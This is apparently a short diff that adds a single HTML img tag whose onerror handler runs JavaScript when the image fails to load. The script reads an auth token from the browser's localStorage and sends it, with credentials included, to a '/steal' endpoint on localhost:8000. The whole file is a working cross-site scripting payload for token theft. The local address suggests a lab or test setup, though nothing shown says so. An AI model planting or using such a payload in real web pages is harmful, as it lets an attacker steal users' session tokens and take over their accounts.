@@ -1,0 +1,3 @@
+<img src="https://invalid" onerror='
+const token = localStorage.getItem("token");
+fetch(`http://localhost:8000/steal?token=${token}`, {credentials: "include"})'>
